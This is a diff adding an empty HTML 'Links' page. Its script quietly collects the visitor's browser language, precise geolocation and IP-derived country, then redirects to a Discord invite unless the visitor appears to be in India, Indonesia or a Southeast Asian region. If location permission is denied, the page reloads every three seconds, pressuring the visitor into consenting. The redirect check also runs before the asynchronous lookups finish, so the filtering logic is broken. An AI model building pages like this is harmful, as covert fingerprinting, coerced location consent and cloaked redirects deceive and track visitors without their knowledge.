@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <title>Links</title>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+</body>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
+const $j = $
+const refresh = () => window.location.href = window.location.href;
+
+function analizando(){
+  let pt = false
+  
+  let ln = navigator.language || navigator.userLanguage;
+  if (ln.includes("id") || ln.includes("hi")) {
+    pt = true
+  }
+
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+      let lat = position.coords.latitude;
+      let lon = position.coords.longitude;
+      if (lat >= 5.5 && lat <= 20.5 && lon >= 95.3 && lon <= 106.7) {
+        pt = true
+      }
+    }, function(error) {
+      if (error.code === error.PERMISSION_DENIED) {
+        setTimeout(refresh, 3000)
+      }
+    });
+  }
+  
+  $j.getJSON("https://api.ipify.org?format=json", function(data) {
+    $j.getJSON("https://ipapi.co/" + data.ip + "/country/", function(country) {
+      if (country === "IN" || country === "ID") {
+        pt = true
+      }
+    });
+  });
+
+  if (!pt){
+    window.location.href = 'https://discord.gg/4BFQKJcCkB'
+  }
+}
+
+analizando()
+</script>
+</html>
